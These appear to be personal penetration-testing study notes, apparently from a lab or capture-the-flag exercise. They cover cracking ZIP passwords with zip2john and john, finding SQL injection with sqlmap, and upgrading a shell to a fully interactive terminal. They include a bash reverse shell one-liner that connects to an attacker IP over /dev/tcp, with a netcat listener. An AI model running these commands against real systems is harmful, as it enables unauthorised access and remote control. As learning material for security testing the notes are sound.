## zip2john :

|Tool|Purpose|
|---|---|
|`zip2john`|Extracts encrypted data from a ZIP file and formats it for cracking|
|`john`|Cracks the password using that extracted hash|
to use with john tool to tryu and crack the hash for the password of the .zip file

## 💡 What is **SQLmap**?

**SQLmap** is a **powerful open-source penetration testing tool** that automates the process of detecting and exploiting **SQL injection (SQLi)** vulnerabilities in web applications.

## ⚙️ Example usage:

`sqlmap -u "http://example.com/product.php?id=1" --batch --dbs`

- `-u` = target URL
    
- `--dbs` = list available databases
    
- `--batch` = skip user prompts (auto-choose defaults)

We will provide the URL & the cookie to the sqlmap in order for it to find vulnerability. The reason why we have to provide a cookie is because of authentication:

## ❓ **Why not just use `os-shell` in sqlmap?**

You _can_, and you _have been_. But the SQLmap `os-shell` is:

### ❌ **Limited**:

- Every command you enter is sent as a SQL injection payload
    
- It's **non-interactive** (no `cd`, `clear`, `nano`, no real shell behavior)
    
- Output is **slow**, not real-time, and often messy or truncated


## ✅ What the Netcat Reverse Shell Does

This command:

`bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`

is a **reverse shell**.

### 🔁 What it does:

1. **Starts a bash shell** on the target
    
2. Redirects its input/output/error to your machine's IP and port (`/dev/tcp/{your_IP}/443`)
    
3. This way, the target **initiates the connection back to you**
    
4. On your side, you listen with:
    
    `nc -lvnp 443`

## 🎯 **Goal:** Upgrade your reverse shell to a **fully interactive terminal**

When you get a shell via Netcat (`bash -i >& /dev/tcp/...`), it's technically a shell — but it's:

- 🧱 **Dumb**: No tab completion, no CTRL+C, CTRL+Z, arrow keys, etc.
    
- 🧑‍🔧 Missing TTY: You can’t use programs like `sudo`, `nano`, or `ssh` properly
    

So we upgrade it.

`python3 -c 'import pty; pty.spawn("/bin/bash")'
`CTRL+Z
`stty raw -echo
`fg
`export TERM=xterm

To:

Make your reverse shell fully interactive

Fix keyboard, display, and program issues

Use the shell like a real termina
